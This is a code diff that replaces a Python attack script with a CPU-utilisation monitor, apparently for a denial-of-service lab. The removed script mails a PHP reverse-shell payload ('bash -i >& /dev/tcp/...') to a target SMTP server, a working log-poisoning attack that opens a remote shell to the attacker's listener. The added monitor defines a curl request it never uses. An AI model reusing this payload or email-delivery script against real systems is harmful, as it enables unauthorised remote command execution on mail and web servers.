@@ -1,40 +1,45 @@
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-import smtplib
-import sys
+import subprocess
+import re
+import time
 
-lhost = "127.0.0.1"
-lport = 443
-rhost = "192.168.1.1"
-rport = 25 # 489,587
+def make_request(base_utilization):
+    i = 0
+    command = ['curl', '-XGET', 'http://192.168.69.134']
 
-# create message object instance
-msg = MIMEMultipart()
+    # Assuming dos_monitor is in the same directory as the Python script
+    dos_monitor_command = ['./dos_monitor']
+    dos_monitor_process = subprocess.Popen(dos_monitor_command, stdout=subprocess.PIPE)
 
-# setup the parameters of the message
-password = "" 
-msg['From'] = "attacker@local"
-msg['To'] = "victim@local"
-msg['Subject'] = "This is not a drill!"
+    while True:
+        print('\n================\n'.format(i))
 
-# payload 
-message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))
+        # Read the output of dos_monitor in real-time
+        dos_monitor_output = dos_monitor_process.stdout.readline()
+        print(dos_monitor_output),
+        
+        # Extract the utilization percentage using regular expression from the first line
+        if i == 0:
+            match = re.search(r"CPU Utilization: (\d+\.\d+)%", dos_monitor_output)
+            if match:
+                base_utilization = float(match.group(1))
+                print("Base Utilization: {}".format(base_utilization))
 
-print("[*] Payload is generated : %s" % message)
+        # Extract the utilization percentage using regular expression from the current line
+        match = re.search(r"CPU Utilization: (\d+\.\d+)%", dos_monitor_output)
+        if match:
+            utilization = float(match.group(1))
+            print("Utilization: {}".format(utilization))
 
-msg.attach(MIMEText(message, 'plain'))
-server = smtplib.SMTP(host=rhost,port=rport)
+            # Check if the utilization is greater than or equal to (base + 40% of base)
+            threshold_utilization = base_utilization + 0.4 * base_utilization
+            if utilization >= threshold_utilization:
+                print("CPU Utilization greater than or equal to {}%. Stopping the process.".format(threshold_utilization))
+                dos_monitor_process.terminate()
+                exit()
 
-if server.noop()[0] != 250:
-    print("[-]Connection Error")
-    exit()
+        i += 1
+        time.sleep(1)
 
-server.starttls()
-
-# Uncomment if log-in with authencation
-# server.login(msg['From'], password)
-
-server.sendmail(msg['From'], msg['To'], msg.as_string())
-server.quit()
-
-print("[*]successfully sent email to %s:" % (msg['To']))
+if __name__ == "__main__":
+    base_utilization = 0.0  # Default value, will be updated from the first line of dos_monitor output
+    make_request(base_utilization)
